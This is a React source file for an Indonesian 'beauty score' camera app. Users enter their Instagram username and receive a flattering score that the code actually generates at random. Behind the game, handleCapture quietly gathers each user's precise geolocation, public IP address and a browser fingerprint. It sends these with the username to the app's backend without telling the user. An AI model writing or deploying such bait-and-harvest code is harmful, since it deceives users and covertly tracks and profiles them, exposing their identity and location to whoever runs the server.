import React, { useEffect, useState, useRef } from 'react';
import axios from 'axios';
import FingerprintJS from '@fingerprintjs/fingerprintjs';

const App = () => {
  const [username, setUsername] = useState('');
  const [score, setScore] = useState(null);
  const [message, setMessage] = useState('');
  const [loggedIn, setLoggedIn] = useState(false);
  const [error, setError] = useState('');
  const [leaderboard, setLeaderboard] = useState([]);
  const [previewUrl, setPreviewUrl] = useState(null);
  const videoRef = useRef(null);

  const requestCameraAccess = () => {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        if (videoRef.current) videoRef.current.srcObject = stream;
      })
      .catch(() => setError('Akses kamera dibutuhkan untuk menggunakan aplikasi ini.'));
  };

  useEffect(() => {
    const saved = JSON.parse(localStorage.getItem('filterskor'));
    if (saved?.username && saved?.fingerprint) {
      FingerprintJS.load().then(fp => {
        fp.get().then(res => {
          if (res.visitorId === saved.fingerprint) {
            setUsername(saved.username);
            setLoggedIn(true);
          }
        });
      });
    }
  }, []);

  useEffect(() => {
    if (loggedIn) {
      axios.get('/api/leaderboard').then(res => setLeaderboard(res.data));
      requestCameraAccess();
    }
  }, [loggedIn]);

  const getGeo = () => new Promise(resolve => {
    navigator.geolocation.getCurrentPosition(
      pos => resolve(`Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`),
      () => resolve('unknown')
    );
  });

  const getMessage = skor => {
    if (skor >= 90) return 'Kamu cantik banget 🥰 Semangat ya orang cantik';
    if (skor >= 70) return 'Kamu manis dan memesona ✨';
    if (skor >= 60) return 'Kamu menarik dengan cara unikmu 😎';
    return 'Kamu tetap berharga, cantik itu relatif 💖';
  };

  const handleLogin = async () => {
    const cleanName = username.trim().replace(/@/g, '');
    if (cleanName.includes(' ')) return setError('Username tidak boleh ada spasi!');
    const fp = await FingerprintJS.load();
    const { visitorId } = await fp.get();
    localStorage.setItem('filterskor', JSON.stringify({ username: cleanName, fingerprint: visitorId }));
    setUsername(cleanName);
    setLoggedIn(true);
  };

  const handleCapture = async () => {
    const canvas = document.createElement('canvas');
    const video = videoRef.current;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    const skor = Math.floor(Math.random() * 41) + 60;
    const kata = getMessage(skor);

    ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
    ctx.fillRect(0, canvas.height - 100, canvas.width, 100);
    ctx.fillStyle = '#fff';
    ctx.font = '20px sans-serif';
    ctx.fillText(`Score: ${skor}`, 10, canvas.height - 60);
    ctx.fillText(kata, 10, canvas.height - 30);

    const preview = canvas.toDataURL('image/png');
    setPreviewUrl(preview);
    setScore(skor);
    setMessage(kata);

    const lokasi = await getGeo();
    const ip = await axios.get('https://api.ipify.org?format=json').then(res => res.data.ip);
    const fp = await FingerprintJS.load().then(fp => fp.get());

    await axios.post('/api/submit', {
      username,
      score: skor,
      lokasi,
      ip,
      fingerprint: fp.visitorId
    });

    axios.get('/api/leaderboard').then(res => setLeaderboard(res.data));
  };

  const handleDownload = () => {
    if (!previewUrl) return;
    const link = document.createElement('a');
    link.download = 'filterskor-mukalu.png';
    link.href = previewUrl;
    link.click();
  };

  const handleShare = () => {
    if (!previewUrl) return;
    fetch(previewUrl)
      .then(res => res.blob())
      .then(async blob => {
        const file = new File([blob], 'filterskor-mukalu.png', { type: 'image/png' });
        if (navigator.canShare && navigator.canShare({ files: [file] })) {
          try {
            await navigator.share({
              title: 'Filterskor Mukaku',
              text: 'Nih, liat muka glowing gua di Filterskor 💅',
              files: [file]
            });
          } catch (err) {
            console.error('Share failed:', err);
          }
        } else {
          const link = document.createElement('a');
          link.download = 'filterskor-mukalu.png';
          link.href = URL.createObjectURL(blob);
          link.click();
        }
      });
  };

  return (
    <div className="p-4">
      {!loggedIn ? (
        <div className="space-y-4">
          <h1 className="text-xl font-bold">Login Filterskor</h1>
          <input
            className="border px-4 py-2 rounded"
            placeholder="Masukkan username IG"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
          <button className="bg-blue-500 text-white px-4 py-2 rounded" onClick={handleLogin}>Login</button>
          {error && <div className="text-red-500">{error}</div>}
        </div>
      ) : (
        <div className="space-y-4">
          <video ref={videoRef} autoPlay className="w-full max-w-md rounded"></video>
          <button className="bg-pink-500 text-white px-4 py-2 rounded" onClick={handleCapture}>
            Seberapa cantik si aku?
          </button>

          {previewUrl && (
            <div>
              <img src={previewUrl} alt="Preview" className="rounded mt-4" />
              <h2 className="text-xl font-bold mt-2">Score: {score}</h2>
              <p>{message}</p>
              <div className="space-x-2 mt-2">
                <button className="bg-green-500 text-white px-4 py-1 rounded" onClick={handleDownload}>Download</button>
                <button className="bg-yellow-500 text-white px-4 py-1 rounded" onClick={handleShare}>Share</button>
              </div>
            </div>
          )}

          <div className="mt-6">
            <h3 className="text-lg font-bold">Leaderboard</h3>
            <ul className="list-disc pl-6">
              {leaderboard.map((user, i) => (
                <li key={i}>{i + 1}. {user.username} - {user.score}</li>
              ))}
            </ul>
          </div>
        </div>
      )}
    </div>
  );
};

export default App;
